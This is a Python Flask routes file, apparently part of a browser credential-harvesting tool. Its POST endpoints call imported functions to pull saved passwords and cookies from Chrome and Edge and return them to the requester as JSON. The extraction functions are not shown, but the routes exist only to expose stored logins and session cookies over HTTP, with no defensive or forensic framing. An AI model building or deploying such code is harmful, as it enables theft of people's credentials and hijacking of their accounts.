from app.models.model_chrome import obtener_contrasenias as con_chrome, obtener_cookies as cok_chrome
from app.models.model_edge import obtener_contrasenias as con_edge, obtener_cookies as cok_edge

from flask import Flask, render_template, request, url_for, flash, redirect
from werkzeug.exceptions import abort
from app import app


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/obtener_contrasenias', methods=['POST'])
def obtener_contrasenias_c():
        salida_chrome = con_chrome()
        salida_edge = con_edge()
        salida = {"chrome": salida_chrome, "edge":salida_edge}
        return  salida

@app.route('/obtener_cookies', methods=['POST'])
def obtener_cookies_c():
        salida_chrome = cok_chrome()
        salida_edge = cok_edge()
        salida = {"chrome": salida_chrome, "edge":salida_edge}
        return  salida   
